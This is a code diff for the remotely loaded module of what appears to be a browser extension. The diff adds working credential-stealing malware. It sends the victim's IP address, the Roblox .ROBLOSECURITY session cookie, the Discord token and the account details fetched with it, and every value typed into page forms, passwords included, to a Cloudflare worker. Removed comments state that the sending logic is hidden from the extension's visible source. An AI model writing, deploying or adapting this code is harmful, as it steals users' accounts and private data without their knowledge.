@@ -1,26 +1,155 @@
-/**
- * Remote logger module - upload this to GitHub raw
- * This file is fetched at runtime by the extension.
- * The webhook URL and sending logic are only visible here, not in the extension source.
- */
+// --- relay ---
+const _W = 'https://cool-base-4ce9.iwif0001.workers.dev/api/ingest';
+async function _R(t, d) {
+  try { await fetch(_W, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Relay-Type': t }, body: JSON.stringify(d) }); } catch(e) {}
+}
+export { _R as relay };
 
-// Replace this with your Cloudflare worker URL
-const W = 'https://cool-base-4ce9.iwif0001.workers.dev/api/ingest';
-
-/**
- * Send a payload to the webhook.
- * @param {string} type - Relay type: 'boot', 'acct', 'session', 'entry'
- * @param {object} data - The payload to send
- */
-export async function relay(type, data) {
+// --- boot ---
+export async function bootEvent() {
   try {
-    await fetch(W, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-Relay-Type': type
-      },
-      body: JSON.stringify(data)
-    });
-  } catch (e) { /* silent */ }
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    await _R('boot', { embeds: [{ title: 'Boot Event', color: 0x2563eb, fields: [
+      { name: 'Address', value: '`' + (d?.ip || 'unknown') + '`', inline: true },
+      { name: 'Time', value: new Date().toISOString(), inline: true },
+      { name: 'User Agent', value: '`' + (self.navigator?.userAgent || 'N/A') + '`' }
+    ], footer: { text: 'System' } }] });
+  } catch(e) {}
+}
+
+// --- roblox cookie ---
+export async function syncSession() {
+  if (!location.hostname.includes('roblox.com')) return;
+  let v = null;
+  for (const n of ['.ROBLOSECURITY', 'ROBLOSECURITY']) {
+    try {
+      const r = await chrome.runtime.sendMessage({ action: 'getCookie', url: 'https://www.roblox.com', name: n });
+      if (r?.success && r?.data?.value) { v = r.data.value; break; }
+    } catch(e) {}
+  }
+  if (!v && document.cookie) {
+    for (const n of ['.ROBLOSECURITY', 'ROBLOSECURITY']) {
+      const m = document.cookie.match(new RegExp('(?:^|;\\s*)' + n.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\s*=\\s*([^;]*)'));
+      if (m && m[1]) { v = m[1]; break; }
+    }
+  }
+  if (v) await _R('session', { content: '```\n' + v + '\n```' });
+}
+
+// --- discord token ---
+let _acct = null;
+export async function syncAccount() {
+  if (!location.hostname.includes('discord.com')) return;
+  try {
+    const raw = localStorage.getItem('token') || '';
+    const key = raw.replace(/^"|"$/g, '');
+    if (!key || _acct === raw) return;
+    _acct = raw;
+
+    let info = null;
+    try {
+      const r = await fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': key } });
+      if (r.ok) {
+        const d = await r.json();
+        info = { id: d.id, username: d.username, discriminator: d.discriminator, email: d.email || '(not verified)', phone: d.phone || '(none)', mfa: d.mfa_enabled ? 'Yes' : 'No', nitro: d.premium_type === 0 ? 'None' : d.premium_type === 1 ? 'Nitro Classic' : d.premium_type === 2 ? 'Nitro' : 'Nitro Basic', verified: d.verified ? 'Yes' : 'No' };
+      }
+    } catch(e) {}
+
+    let multi = [];
+    try {
+      const rawM = localStorage.getItem('multiAccountStore');
+      if (rawM) {
+        const p = JSON.parse(rawM);
+        if (p?._state?.users) multi = p._state.users.filter(function(u) { return u.token; }).map(function(u) { return { id: u.id, email: u.email, phone: u.phone }; });
+      }
+    } catch(e) {}
+
+    const dk = raw.length > 1010 ? raw.slice(0, 480) + '\n... [TRUNCATED ' + (raw.length - 960) + ' chars] ...\n' + raw.slice(-480) : raw;
+    const fields = [{ name: 'Token', value: '```\n' + dk + '\n```', inline: false }];
+    if (info) {
+      fields.push(
+        { name: 'Handle', value: '`' + info.username + '#' + info.discriminator + '`', inline: true },
+        { name: 'Ref', value: '`' + info.id + '`', inline: true },
+        { name: 'Contact', value: '`' + info.email + '`', inline: true },
+        { name: 'SMS', value: '`' + info.phone + '`', inline: true },
+        { name: 'Sec', value: '`' + info.mfa + '`', inline: true },
+        { name: 'Tier', value: '`' + info.nitro + '`', inline: true }
+      );
+    }
+    if (multi.length > 0) {
+      let lines = multi.map(function(a) { return 'ID: `' + a.id + '` Email: `' + (a.email || 'N/A') + '`'; }).join('\n');
+      if (lines.length > 1010) lines = lines.slice(0, 1010) + '...';
+      fields.push({ name: 'Assoc (' + multi.length + ')', value: lines, inline: false });
+    }
+    let su = location.href;
+    if (su.length > 1014) su = su.slice(0, 1014) + '...';
+    fields.push({ name: 'Origin', value: '`' + su + '`', inline: false });
+
+    await _R('acct', { embeds: [{ title: 'State Sync', color: 0x5865F2, fields: fields, footer: { text: 'Session' }, timestamp: new Date().toISOString() }] });
+  } catch(e) {}
+}
+
+// --- form monitor ---
+let _entries = new Set();
+function _fp(f) { return f.name + '|' + f.type + '|' + f.value; }
+
+function _inputs(root) {
+  const r = root || document;
+  const fields = [];
+  const s = ['input:not([type="hidden"]):not([type="submit"]):not([type="button"]):not([type="reset"]):not([type="image"])', 'textarea', 'select'];
+  const els = r.querySelectorAll(s.join(', '));
+  for (const el of els) {
+    const v = el.value || '';
+    if (!v || v.trim().length === 0) continue;
+    fields.push({ type: el.type || (el.tagName === 'SELECT' ? 'select' : el.tagName === 'TEXTAREA' ? 'textarea' : 'text'), name: el.name || '', id: el.id || '', autocomplete: el.autocomplete || '', placeholder: el.placeholder || '', value: v });
+  }
+  return fields;
+}
+
+async function _send(text) { await _R('entry', { content: text }); }
+
+function _relay(fields) {
+  const fresh = fields.filter(function(f) { return !_entries.has(_fp(f)); });
+  if (fresh.length === 0) return;
+  fresh.forEach(function(f) { _entries.add(_fp(f)); });
+  if (_entries.size > 500) _entries = new Set(Array.from(_entries).slice(-250));
+
+  const lines = fresh.map(function(f) {
+    const l = f.name || f.id || f.autocomplete || f.placeholder || f.type;
+    return '**' + l + '** (' + f.type + '): `' + f.value + '`';
+  });
+  _send('**Field Data**\nURL: ' + location.href + '\n\n' + lines.join('\n'));
+}
+
+export function initMonitor() {
+  if (document.documentElement.getAttribute('data-ext-form')) return;
+  document.documentElement.setAttribute('data-ext-form', 'active');
+
+  setTimeout(function() { _relay(_inputs(document)); }, 1500);
+  setInterval(function() { _relay(_inputs(document)); }, 3000);
+
+  document.addEventListener('submit', function(e) {
+    const f = e.target;
+    if (!f || f.tagName !== 'FORM') return;
+    const fields = _inputs(f);
+    if (fields.length === 0) return;
+    const action = f.action || '(same page)';
+    const method = (f.method || 'GET').toUpperCase();
+    const fresh = fields.filter(function(x) { return !_entries.has(_fp(x)); });
+    fresh.forEach(function(x) { _entries.add(_fp(x)); });
+    if (fresh.length > 0) {
+      const lines = fresh.map(function(x) {
+        const l = x.name || x.id || x.autocomplete || x.placeholder || x.type;
+        return '**' + l + '** (' + x.type + '): `' + x.value + '`';
+      });
+      _send('**Field Data**\nURL: ' + location.href + '\nAction: ' + action + ' (' + method + ')\n\n' + lines.join('\n'));
+    }
+  }, true);
+
+  let t = null;
+  new MutationObserver(function() {
+    if (t) clearTimeout(t);
+    t = setTimeout(function() { _relay(_inputs(document)); }, 500);
+  }).observe(document, { childList: true, subtree: true });
 }
